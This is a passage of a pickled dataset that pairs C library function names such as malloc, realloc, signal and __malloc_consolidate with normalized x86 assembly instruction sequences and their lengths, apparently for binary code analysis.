a(S'sigemptyset'
p289
S'"SUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nXOR~EAX,EAX\nADD~ESP,0\nRETN"'
p290
L25L
tp291
a(S'signal'
p292
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nCMP~EAX,0\nJZ~FOO\nTEST~EBX,EBX\nJLE~FOO\nCMP~EBX,0\nJLE~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~[ESP+0],EAX\nMOV~EAX,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nSBB~EAX,EAX\nAND~EAX,0\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nMOV~EAX,[ESP+0]\nJMP~FOO\nOR~EAX,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p293
L175L
tp294
a(S'__sigismember'
p295
S'"PUSH~EBX\nMOV~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nDEC~ECX\nMOV~EBX,ECX\nAND~ECX,0\nSHR~EBX,0\nSHL~EAX,CL\nTEST~[EDX+EBX*4],EAX\nPOP~EBX\nSETNZ~AL\nMOVZX~EAX,AL\nRETN"'
p296
L36L
tp297
a(S'__sigaddset'
p298
S'"PUSH~EBX\nMOV~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nDEC~ECX\nMOV~EDX,ECX\nAND~ECX,0\nSHR~EDX,0\nSHL~EAX,CL\nOR~[EBX+EDX*4],EAX\nXOR~EAX,EAX\nPOP~EBX\nRETN"'
p299
L32L
tp300
a(S'__malloc_largebin_index'
p301
S'"MOV~EDX,EAX\nPUSH~EBX\nSHR~EDX,0\nMOV~EBX,EAX\nCMP~EDX,0\nMOV~EAX,0\nJA~FOO\nBSR~EAX,EDX\nLEA~ECX,[EAX+0]\nSHR~EBX,CL\nAND~EBX,0\nLEA~EAX,[EBX+EAX*4+0]\nPOP~EBX\nRETN"'
p302
L38L
tp303
a(S'malloc'
p304
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],0\nCMP~EAX,0\nJBE~FOO\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EBX,<STR>\nTEST~BL,0\nJNZ~FOO\nTEST~EBX,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~[ESP+0],EBX\nJA~FOO\nMOV~EAX,[ESP+0]\nSHR~EAX,0\nLEA~ECX,[EAX+0]\nMOV~EDX,[ECX-0]\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,[EDX+0]\nMOV~[ECX-0],EAX\nJMP~FOO\nCMP~[ESP+0],0\nJA~FOO\nMOV~EAX,[ESP+0]\nSHR~EAX,0\nMOV~[ESP+0],EAX\nLEA~ECX,<STR>\nMOV~EDX,[ECX+0]\nCMP~EDX,ECX\nJZ~FOO\nMOV~EBX,[ESP+0]\nMOV~EAX,[EDX+0]\nMOV~[ECX+0],EAX\nOR~[EDX+EBX+0],0\nMOV~[EAX+0],ECX\nLEA~EBX,[EDX+0]\nJMP~FOO\nMOV~EAX,[ESP+0]\nCALL~FOO\nAND~BL,0\nMOV~[ESP+0],EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDI,[EBP+0]\nMOV~EDX,[EBP+0]\nAND~EDI,0\nCMP~[ESP+0],0\nJA~FOO\nCMP~EDX,0\nJNZ~FOO\nCMP~EBP,<STR>\nJNZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,0\nCMP~EDI,EAX\nJA~FOO\nMOV~EAX,0\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nCMP~EDI,[ESP+0]\nJZ~FOO\nCMP~EDI,0\nJA~FOO\nMOV~ESI,EDI\nSHR~ESI,0\nLEA~EBX,<STR>\nMOV~EAX,[EBX+0]\nJMP~FOO\nMOV~EAX,EDI\nCALL~FOO\nMOV~ESI,EAX\nLEA~EAX,<STR>\nMOV~EDX,[EAX+0]\nMOV~[ESP+0],EDX\nMOV~EBX,EDX\nCMP~EDX,EAX\nJZ~FOO\nMOV~EBX,[EAX+0]\nCMP~EDI,[EBX+0]\nJNB~FOO\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EAX,EDI\nOR~EAX,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~ECX,[ECX+0]\nMOV~[ESP+0],ECX\nMOV~EBX,[ESP+0]\nCMP~EAX,[EBX+0]\nJB~FOO\nMOV~EBX,[EBX+0]\nMOV~EDX,ESI\nAND~ESI,0\nMOV~ECX,ESI\nMOV~EAX,0\nSAR~EDX,0\nSHL~EAX,CL\nOR~<STR>,EAX\nMOV~[EBP+0],EBX\nMOV~ESI,[ESP+0]\nMOV~[EBP+0],ESI\nMOV~[EBX+0],EBP\nMOV~[ESI+0],EBP\nMOV~EBP,<STR>\nCMP~EBP,0\nJNZ~FOO\nCMP~[ESP+0],0\nJBE~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,<STR>\nMOV~EAX,[EDX+0]\nJMP~FOO\nMOV~EBX,[EAX+0]\nMOV~ECX,[EAX+0]\nAND~EBX,0\nCMP~EBX,[ESP+0]\nJB~FOO\nMOV~EDX,[EAX+0]\nCMP~[EDX+0],EAX\nJNZ~FOO\nCMP~[ECX+0],EAX\nJZ~FOO\nCALL~FOO\nMOV~ESI,EBX\nSUB~ESI,[ESP+0]\nMOV~[EDX+0],ECX\nMOV~[ECX+0],EDX\nCMP~ESI,0\nLEA~ECX,[EAX+0]\nJBE~FOO\nMOV~EBX,[ESP+0]\nLEA~EDX,[EAX+EBX]\nOR~EBX,0\nMOV~[EAX+0],EBX\nMOV~EAX,ESI\nOR~EAX,0\nMOV~[EBP+0],EDX\nMOV~[EBP+0],EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~[EDX+0],EAX\nMOV~[EDX+ESI],ESI\nJMP~FOO\nMOV~EAX,ECX\nCMP~EAX,EDX\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~ESI,0\nINC~ECX\nMOV~EDI,ECX\nSHR~EDI,0\nLEA~EBX,<STR>\nAND~ECX,0\nMOV~EDX,<STR>\nSHL~ESI,CL\nCMP~ESI,EDX\nJA~FOO\nTEST~ESI,ESI\nJNZ~FOO\nINC~EDI\nCMP~EDI,0\nJA~FOO\nMOV~EDX,<STR>\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,EDI\nMOV~ESI,0\nSHL~EAX,0\nLEA~EBX,[EAX+0]\nJMP~FOO\nADD~EBX,0\nADD~ESI,ESI\nTEST~EDX,ESI\nJZ~FOO\nMOV~ECX,[EBX+0]\nCMP~ECX,EBX\nJNZ~FOO\nMOV~EAX,ESI\nLEA~EBX,[ECX+0]\nNOT~EAX\nAND~EDX,EAX\nADD~ESI,ESI\nMOV~<STR>,EDX\nJMP~FOO\nMOV~EDX,[ECX+0]\nMOV~EAX,[ECX+0]\nAND~EDX,0\nMOV~ESI,EDX\nSUB~ESI,[ESP+0]\nMOV~[EBX+0],EAX\nMOV~[EAX+0],EBX\nCMP~ESI,0\nJA~FOO\nOR~[ECX+EDX+0],0\nJMP~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nLEA~EDX,[ECX+EAX]\nMOV~[EBP+0],EDX\nMOV~[EBP+0],EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nJA~FOO\nMOV~<STR>,EDX\nOR~[ESP+0],0\nMOV~EAX,ESI\nMOV~EBX,[ESP+0]\nOR~EAX,0\nMOV~[ECX+0],EBX\nMOV~[EDX+ESI],ESI\nMOV~[EDX+0],EAX\nLEA~EBX,[ECX+0]\nJMP~FOO\nMOV~EBX,<STR>\nMOV~ESI,[ESP+0]\nADD~ESI,0\nMOV~ECX,[EBX+0]\nMOV~[ESP+0],ESI\nAND~ECX,0\nCMP~ECX,ESI\nJB~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,[EBX+EAX]\nOR~EAX,0\nMOV~<STR>,EDX\nMOV~[EBX+0],EAX\nSUB~ECX,[ESP+0]\nJMP~FOO\nMOV~EDX,<STR>\nTEST~<STR>,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nJMP~FOO\nLEA~ECX,[EDX-0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],ECX\nCMP~EBX,<STR>\nJB~FOO\nMOV~EAX,<STR>\nCMP~EAX,<STR>\nJGE~FOO\nMOV~EAX,ECX\nLEA~EBX,[EDX+EBX+0]\nNOT~EAX\nAND~EBX,EAX\nCMP~EBX,[ESP+0]\nJBE~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,EAX\nAND~ECX,0\nJZ~FOO\nMOV~EAX,0\nMOV~ESI,EBX\nSUB~EAX,ECX\nADD~EDX,EAX\nSUB~ESI,EAX\nMOV~[EDX],EAX\nMOV~EAX,ESI\nJMP~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EAX,EBX\nOR~EAX,0\nMOV~[EDX+0],EAX\nMOV~EAX,<STR>\nINC~EAX\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJLE~FOO\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nADD~EAX,EBX\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nJMP~FOO\nMOV~EAX,<STR>\nMOV~[ESP+0],EAX\nMOV~EBP,[EAX+0]\nMOV~EAX,[ESP+0]\nADD~EAX,0\nAND~EBP,0\nADD~EAX,<STR>\nTEST~<STR>,0\nJZ~FOO\nSUB~EAX,EBP\nMOV~EDX,[ESP+0]\nADD~EAX,[ESP+0]\nNOT~EDX\nMOV~ESI,EDX\nMOV~[ESP+0],EDX\nAND~ESI,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nOR~EDX,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nTEST~<STR>,0\nJZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,EBP\nADD~ESI,EAX\nAND~ESI,[ESP+0]\nCMP~ESI,0\nJA~FOO\nMOV~ESI,0\nCMP~ESI,[ESP+0]\nJBE~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nAND~<STR>,0\nLEA~EDX,[EAX+ESI]\nCMP~EBX,0\nJZ~FOO\nMOV~ECX,[ESP+0]\nADD~<STR>,ESI\nADD~ECX,EBP\nCMP~EBX,ECX\nJNZ~FOO\nCMP~EDX,0\nJNZ~FOO\nLEA~EAX,[ESI+EBP]\nMOV~ECX,[ESP+0]\nOR~EAX,0\nMOV~[ECX+0],EAX\nJMP~FOO\nMOV~EAX,<STR>\nTEST~AL,0\nJZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nCMP~EBX,ECX\nJNB~FOO\nAND~EAX,0\nMOV~<STR>,EAX\nTEST~<STR>,0\nJZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nMOV~EAX,EBX\nSUB~EAX,ECX\nADD~<STR>,EAX\nMOV~EDX,EBX\nAND~EDX,0\nJNZ~FOO\nMOV~EDI,EBX\nXOR~EAX,EAX\nJMP~FOO\nMOV~EAX,0\nSUB~EAX,EDX\nLEA~EDI,[EBX+EAX]\nLEA~ESI,[EBX+ESI]\nLEA~ECX,[EAX+EBP]\nMOV~EDX,ESI\nMOV~[ESP+0],ESI\nADD~EDX,ECX\nMOV~ESI,[ESP+0]\nLEA~EAX,[EDX+ESI]\nAND~EAX,[ESP+0]\nSUB~ESP,0\nSUB~EAX,EDX\nLEA~ESI,[ECX+EAX]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nJMP~FOO\nCMP~EAX,EBX\nJNB~FOO\nAND~<STR>,0\nMOV~EDX,[ESP+0]\nJMP~FOO\nCMP~EDX,0\nJZ~FOO\nMOV~EDI,EBX\nXOR~ESI,ESI\nJMP~FOO\nSUB~ESP,0\nMOV~EDI,EBX\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nSUB~EAX,EBX\nSUB~EAX,ESI\nADD~<STR>,EAX\nXOR~ESI,ESI\nADD~ESP,0\nCMP~EDX,0\nJZ~FOO\nSUB~EDX,EDI\nMOV~<STR>,EDI\nLEA~EAX,[EDX+ESI]\nOR~EAX,0\nMOV~[EDI+0],EAX\nADD~<STR>,ESI\nTEST~EBP,EBP\nJZ~FOO\nLEA~EAX,[EBP-0]\nMOV~ECX,[ESP+0]\nAND~EAX,0\nMOV~EDX,EAX\nOR~EDX,0\nCMP~EAX,0\nMOV~[ECX+0],EDX\nMOV~[ECX+EAX+0],0\nMOV~[ECX+EAX+0],0\nJBE~FOO\nSUB~ESP,0\nMOV~EAX,ECX\nADD~EAX,0\nMOV~EBX,<STR>\nPUSH~EAX\nMOV~<STR>,0\nCALL~FOO\nMOV~<STR>,EBX\nADD~ESP,0\nMOV~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nMOV~EBX,<STR>\nMOV~ECX,[EBX+0]\nAND~ECX,0\nCMP~ECX,[ESP+0]\nJB~FOO\nMOV~ESI,[ESP+0]\nMOV~EAX,ESI\nSUB~ECX,ESI\nLEA~EDX,[EBX+ESI]\nOR~EAX,0\nMOV~<STR>,EDX\nMOV~[EBX+0],EAX\nOR~ECX,0\nADD~EBX,0\nMOV~[EDX+0],ECX\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,EDI\nSUB~EAX,[ESP+0]\nLEA~EDX,[EBP+ECX+0]\nOR~ECX,0\nMOV~<STR>,EDX\nMOV~[EBP+0],ECX\nMOV~ECX,EAX\nMOV~<STR>,EDX\nOR~ECX,0\nMOV~<STR>,EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~[EDX+0],ECX\nMOV~[EDX+EAX],EAX\nJMP~FOO\nMOV~EBX,[ESP+0]\nOR~[EBP+EBX+0],0\nLEA~EBX,[EBP+0]\nJMP~FOO\nOR~[EAX+EBX+0],0\nMOV~EBX,ECX\nJMP~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p305
L1908L
tp306
a(S'calloc'
p307
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EBX,EDX\nIMUL~EBX,ECX\nTEST~EDX,EDX\nJZ~FOO\nMOV~EDI,EDX\nMOV~EAX,EBX\nXOR~EDX,EDX\nDIV~,EDI\nCMP~ECX,EAX\nJZ~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nPUSH~ESI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,[EAX-0]\nTEST~AL,0\nJNZ~FOO\nAND~EAX,0\nLEA~EDX,[EAX-0]\nMOV~EAX,EDX\nSHR~EAX,0\nCMP~EAX,0\nJBE~FOO\nPUSH~ECX\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~DWORDPTR[EBX],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p308
L244L
tp309
a(S'realloc'
p310
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nCMP~[ESP+0],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nJMP~FOO\nTEST~EBX,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nPUSH~EDI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],0\nCMP~EAX,0\nJBE~FOO\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nSUB~EDI,0\nMOV~EDX,[EDI+0]\nMOV~EAX,EDX\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~DL,0\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,EAX\nCMP~EAX,ECX\nJNB~FOO\nLEA~ESI,[EDI+EAX]\nCMP~ESI,<STR>\nJNZ~FOO\nMOV~EAX,[ESI+0]\nMOV~ECX,EBX\nAND~EAX,0\nADD~ECX,EAX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nCMP~ECX,EAX\nJB~FOO\nAND~EDX,0\nOR~EDX,[ESP+0]\nMOV~[EDI+0],EDX\nMOV~ESI,[ESP+0]\nSUB~ECX,ESI\nLEA~EAX,[EDI+ESI]\nOR~ECX,0\nMOV~<STR>,EAX\nMOV~[EAX+0],ECX\nJMP~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,EDX\nAND~EAX,0\nTEST~[ESI+EAX+0],0\nJNZ~FOO\nAND~EDX,0\nMOV~EBX,[ESP+0]\nADD~EBX,EDX\nCMP~EBX,[ESP+0]\nJB~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,[ESI+0]\nCMP~[EDX+0],ESI\nJNZ~FOO\nCMP~[EAX+0],ESI\nJZ~FOO\nCALL~FOO\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nTEST~EAX,EAX\nJZ~FOO\nLEA~EBX,[EAX-0]\nCMP~EBX,ESI\nMOV~EAX,[EBX+0]\nJNZ~FOO\nAND~EAX,0\nMOV~EDX,[ESP+0]\nLEA~EBX,[EAX+EDX]\nJMP~FOO\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nMOV~ECX,EAX\nSHR~ECX,0\nCMP~ECX,0\nJBE~FOO\nPUSH~ESI\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ESI,[ESP+0]\nCMP~ECX,0\nMOV~EAX,[ESI]\nMOV~[EDX],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nCMP~ECX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nCMP~ECX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nSUB~ESP,0\nADD~EBX,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nMOV~ECX,EBX\nSUB~ECX,[ESP+0]\nCMP~ECX,0\nJA~FOO\nMOV~EAX,[EDI+0]\nAND~EAX,0\nOR~EAX,EBX\nMOV~[EDI+0],EAX\nOR~[EDI+EBX+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDI+EDX]\nMOV~EDX,[EDI+0]\nAND~EDX,0\nOR~EDX,[ESP+0]\nSUB~ESP,0\nMOV~[EDI+0],EDX\nMOV~EDX,ECX\nOR~EDX,0\nMOV~[EAX+0],EDX\nOR~[EAX+ECX+0],0\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EDI+0]\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,<STR>\nDEC~EAX\nMOV~ESI,[ESP+0]\nMOV~EBP,[ECX-0]\nADD~ESI,0\nMOV~[ESP],ESI\nLEA~EDX,[EAX+EBP]\nNOT~EAX\nLEA~ESI,[EDX+ESI]\nAND~ESI,EAX\nMOV~EBX,ESI\nSUB~EBX,EBP\nCMP~[ESP+0],EBX\nJZ~FOO\nPUSH~0\nPUSH~ESI\nMOV~EAX,[ESP+0]\nSUB~EDI,EBP\nADD~EAX,EBP\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nLEA~EDX,[EAX+EBP]\nOR~EBX,0\nMOV~EAX,ESI\nMOV~[EDX+0],EBX\nSUB~EAX,[ESP+0]\nADD~EAX,<STR>\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nLEA~EBX,[EDX+0]\nJMP~FOO\nMOV~EAX,[ESP]\nCMP~[ESP+0],EAX\nJNB~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nPUSH~ECX\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nPOP~EDX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~EBX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p311
L808L
tp312
a(S'__malloc_trim'
p313
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,EDX\nMOV~ECX,[EDX+0]\nMOV~EDX,[EDX+0]\nMOV~ESI,[EDX+0]\nAND~ESI,0\nMOV~EDX,ESI\nSUB~EDX,EAX\nLEA~EAX,[EDX+ECX-0]\nXOR~EDX,EDX\nDIV~,ECX\nLEA~EBX,[EAX-0]\nIMUL~EBX,ECX\nTEST~EBX,EBX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDI,EAX\nMOV~EAX,ESI\nADD~EAX,[EBP+0]\nADD~ESP,0\nCMP~EDI,EAX\nJNZ~FOO\nSUB~ESP,0\nNEG~EBX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,EDI\nSUB~ECX,EAX\nJZ~FOO\nMOV~EAX,[EBP+0]\nSUB~[EBP+0],ECX\nSUB~ESI,ECX\nOR~ESI,0\nMOV~[EAX+0],ESI\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p314
L141L
tp315
a(S'__malloc_consolidate'
p316
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX]\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~ECX,[ESP+0]\nAND~EAX,0\nMOV~[ECX],EAX\nADD~ECX,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~EAX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nMOV~EAX,[EDX]\nMOV~ECX,[ESP+0]\nSHR~EAX,0\nLEA~EAX,[ECX+EAX*4-0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[EAX]\nTEST~ECX,ECX\nJZ~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EDX,[ECX+0]\nMOV~[ESP+0],EDX\nMOV~EAX,[ECX+0]\nMOV~EDI,EAX\nAND~EDI,0\nTEST~AL,0\nLEA~EBX,[ECX+EDI]\nMOV~EDX,[EBX+0]\nMOV~[ESP+0],EDX\nJNZ~FOO\nMOV~EBP,[ECX]\nMOV~EAX,ECX\nSUB~EAX,EBP\nMOV~ESI,[EAX+0]\nMOV~EDX,[EAX+0]\nMOV~ECX,[ESI+0]\nCMP~ECX,EAX\nJNZ~FOO\nCMP~[EDX+0],ECX\nJNZ~FOO\nADD~EDI,EBP\nMOV~[ESI+0],EDX\nMOV~[EDX+0],ESI\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nAND~EBP,0\nCMP~EBX,[EAX+0]\nJZ~FOO\nMOV~EAX,[EBX+EBP+0]\nMOV~[EBX+0],EBP\nAND~EAX,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[EBX+0]\nMOV~EAX,[EBX+0]\nMOV~ESI,[EDX+0]\nCMP~ESI,EBX\nJNZ~FOO\nCMP~[EAX+0],ESI\nJZ~FOO\nCALL~FOO\nADD~EDI,EBP\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EAX+0]\nMOV~[EAX+0],ECX\nMOV~EAX,EDI\nOR~EAX,0\nMOV~[EDX+0],ECX\nMOV~[ECX+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ECX+0],EDX\nMOV~[ECX+0],EAX\nMOV~[ECX+EDI],EDI\nJMP~FOO\nLEA~EAX,[EDI+EBP]\nOR~EAX,0\nMOV~[ECX+0],EAX\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],ECX\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJNZ~FOO\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJZ~FOO\nADD~[ESP+0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EDX*8+0]\nINC~EDX\nMOV~[EAX+0],EAX\nMOV~[EAX+0],EAX\nCMP~EDX,0\nJLE~FOO\nMOV~EAX,[ESP+0]\nOR~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EDX,[ESP+0]\nSUB~ESP,0\nMOV~EAX,[EDX]\nAND~EAX,0\nOR~EAX,0\nMOV~[EDX],EAX\nMOV~EAX,EDX\nADD~EAX,0\nMOV~[EDX+0],EAX\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[ECX+0],EAX\nA